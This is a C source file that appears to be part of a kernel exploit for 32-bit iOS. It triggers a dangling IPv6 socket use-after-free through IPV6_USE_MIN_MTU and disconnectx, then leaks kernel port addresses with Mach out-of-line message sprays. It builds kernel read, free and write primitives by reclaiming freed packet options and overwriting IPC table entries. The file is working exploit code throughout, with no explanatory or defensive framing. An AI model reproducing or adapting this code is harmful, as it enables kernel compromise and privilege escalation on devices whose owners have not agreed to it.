#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>

#include "common.h"
#include "offsets.h"
#include "io.h"
#include "memory.h"

int set_min_mtu(int socket, int *minmtu) {
    return setsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(int));
}

int get_min_mtu(int socket, int *minmtu) {
    socklen_t size = sizeof(int);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_pkt_info(int socket, struct in6_pktinfo *pktinfo) {
    socklen_t size = sizeof(struct in6_pktinfo);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

int set_pkt_info(int socket, struct in6_pktinfo *pktinfo) {
    return setsockopt(socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(struct in6_pktinfo));
}

int get_temp_addr(int socket, int *prefertempaddr) {
    socklen_t size = sizeof(int);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

int create_socket(void) {
    int socket_fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (socket_fd < 0) return -1;

    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    size_t size = sizeof(struct so_np_extensions);

    if (setsockopt(socket_fd, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, size) != 0) {
        close(socket_fd);
        return -1;
    }
    return socket_fd;
}

int create_dangling_socket(void) {
    int socket_fd = create_socket();
    if (socket_fd < 0) return -1;

    int minmtu = 0;
    set_min_mtu(socket_fd, &minmtu);
    disconnectx(socket_fd, 0, 0);
    return socket_fd;
}

int *create_multiple_sockets(int count, bool dangling) {
    int *socket_list = calloc(1, sizeof(int) * count);
    if (socket_list == NULL) return NULL;

    for (int i = 0; i < count; i++) {
        if (dangling) socket_list[i] = create_dangling_socket();
        else socket_list[i] = create_socket();

        if (socket_list[i] < 0) {
            for (int j = 0; j < count; j++) {
                if (socket_list[j] >= 0) close(socket_list[j]);
            }

            free(socket_list);
            return NULL;
        }
    }
    return socket_list;
}

void free_socket_list(int *socket_list, int count) {
    for (int i = 0; i < count; i++) {
        if (socket_list[i] >= 0) close(socket_list[i]);
    }
    free(socket_list);
}

mach_port_t create_mach_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    mach_port_t task = mach_task_self();

    kern_return_t kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != 0 || !MACH_PORT_VALID(port)) return MACH_PORT_NULL;

    if (mach_port_insert_right(task, port, port, MACH_MSG_TYPE_MAKE_SEND) != 0) {
        mach_port_deallocate(task, port);
        return MACH_PORT_NULL;
    }
    return port;
}

mach_port_t ool_msg_spray(mach_port_t target, int count) {
    mach_port_t remote = MACH_PORT_NULL;
    mach_port_t task = mach_task_self();

    kern_return_t kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &remote);
    if (kr != 0 || !MACH_PORT_VALID(remote)) return MACH_PORT_NULL;

    mach_port_t *port_list = calloc(1, sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        port_list[i] = target;
    }

    struct ool_msg *msg = calloc(1, sizeof(struct ool_msg));
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = remote;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    msg->body.msgh_descriptor_count = 1;
    msg->ool_ports.address = port_list;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

    kr = mach_msg(&msg->hdr, MACH_SEND_MSG, msg->hdr.msgh_size, 0, 0, 0, 0);
    free(port_list);
    free(msg);

    if (kr != 0) {
        mach_port_deallocate(task, remote);
        return MACH_PORT_NULL;
    }
    return remote;
}

uint32_t find_port_early(mach_port_t port) {
    for (int i = 0; i < 50; i++) {
        for (int j = 0; j < 50; j++) {
            int socket_fd = create_dangling_socket();
            if (socket_fd < 0) continue;

            mach_port_t holder = ool_msg_spray(port, 192/sizeof(uint32_t));
            if (!MACH_PORT_VALID(holder)) {
                close(socket_fd);
                continue;
            }

            uint32_t mtu = 0;
            uint32_t temp_addr = 0;
            get_min_mtu(socket_fd, (int *)&mtu);
            get_temp_addr(socket_fd, (int *)&temp_addr);

            if (mtu != 0xffffffff && mtu != 0 && temp_addr != 0xdeadbeef && mtu == temp_addr) {
                mach_port_destroy(mach_task_self(), holder);
                close(socket_fd);
                return mtu;
            }

            mach_port_destroy(mach_task_self(), holder);
            close(socket_fd);
        }
    }
    return 0;
}

int read20_primitive(uint32_t addr, bool free_addr, uint8_t **data) {
    int *socket_list = create_multiple_sockets(128, true);
    if (socket_list == NULL) return -1;

    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    if (free_addr) addr += 0x4;

    bool socket_found = false;
    int socket_idx = -1;
    int target_socket = -1;

    *(uint32_t*)((uint32_t)fake_opts + sizeof(uint32_t)*2) = addr;
    *(uint32_t*)((uint32_t)fake_opts + 12) = addr;
    *(uint32_t*)((uint32_t)fake_opts + 120) = 0xcafebabe;
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo *)addr;

    for (int i = 0; i < 10; i++) {
        spray_os_unserialize((uint8_t *)fake_opts, sizeof(struct ip6_pktopts));

        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_min_mtu(socket_list[j], &minmtu);
            if (minmtu == 0xcafebabe) {
                socket_found = true;
                socket_idx = j;
                break;
            }
        }
        if (socket_found) break;
    }

    free(fake_opts);
    if (socket_idx != -1) {
        target_socket = socket_list[socket_idx];
        socket_list[socket_idx] = -1;
    }

    free_socket_list(socket_list, 128);
    if (target_socket == -1) return -1;
    uint8_t *temp_data = calloc(1, sizeof(struct in6_pktinfo));

    if (free_addr) {        
        set_pkt_info(target_socket, (struct in6_pktinfo *)temp_data);
        free(temp_data);
        return 0;
    }

    get_pkt_info(target_socket, (struct in6_pktinfo *)(temp_data));
    if (data != NULL) *data = temp_data;
    close(target_socket);
    return 0;
}

uint32_t rk32_early(uint32_t addr) {
    if (addr < 0x80001000 || addr == 0xffffffff) return 0;
    uint8_t *data = NULL;
    for (int i = 0; i < 50; i++) {
        if (read20_primitive(addr, false, &data) != 0) return 0;
        if (data != NULL) {
            uint32_t value = *(uint32_t *)data;
            free(data);
            return value;
        }
    }
    return 0;
}

uint32_t find_port(mach_port_t port, uint32_t self_task_addr) {
    uint32_t itk_space = rk32(self_task_addr + koffsetof(task, itk_space));
    uint32_t is_table = rk32(itk_space + koffsetof(ipc_space, is_table));
    return rk32(is_table + ((port >> 8) * koffsetof(ipc_entry, size)));
}

void deinit_port(mach_port_t port, uint32_t self_task_addr) {
    uint32_t itk_space = rk32(self_task_addr + koffsetof(task, itk_space));
    uint32_t is_table = rk32(itk_space + koffsetof(ipc_space, is_table));
    wk32(is_table + ((port >> 8) * koffsetof(ipc_entry, size)), 0);
    wk32(is_table + ((port >> 8) * koffsetof(ipc_entry, size)) + 0x4, 0);
    mach_port_destroy(mach_task_self(), port);
}
